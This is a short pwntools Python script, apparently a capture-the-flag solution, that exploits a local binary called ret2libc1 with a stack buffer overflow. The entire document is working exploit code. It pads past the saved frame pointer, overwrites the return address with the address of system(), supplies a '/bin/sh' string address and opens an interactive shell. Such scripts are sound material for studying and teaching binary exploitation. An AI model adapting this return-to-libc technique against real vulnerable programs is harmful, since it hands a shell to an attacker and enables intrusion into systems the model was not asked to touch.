from pwn import *
sh = process('./ret2libc1')
esp = 0xffffd260
ebp = 0xffffd2e8
s_offset = 0x1c
system_addr = 0x08048460
binsh = 0x08048720
payload = flat(
			[b'A' * (ebp-esp-s_offset+4), system_addr, b'A'*4, binsh]
		)
sh.sendline(payload)
sh.interactive()
